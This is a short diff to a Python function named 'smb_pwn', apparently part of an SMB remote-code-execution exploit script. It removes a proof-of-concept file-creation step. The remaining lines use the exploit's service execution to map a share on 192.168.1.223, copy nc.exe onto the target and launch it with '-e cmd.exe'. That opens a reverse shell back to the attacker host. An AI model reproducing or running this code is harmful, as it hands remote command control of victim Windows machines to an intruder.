@@ -913,8 +913,6 @@ def smb_pwn(conn, arch):
 	
 	print('creating file c:\\pwned.txt on the target')
 	tid2 = smbConn.connectTree('C$')
-	fid2 = smbConn.createFile(tid2, '/pwned.txt')
-	service_exec(conn, r'cmd /c echo ganteng >> c:\Users\Public\Downloads\kurniawan.txt')
         service_exec(conn, r'cmd /c net use x: \\192.168.1.223\xcode')
         service_exec(conn, r'cmd /c copy x:\nc.exe c:\Users\Public\Downloads')
         service_exec(conn, r'cmd /c c:\Users\Public\Downloads\nc.exe 192.168.1.223 1500 -e cmd.exe')
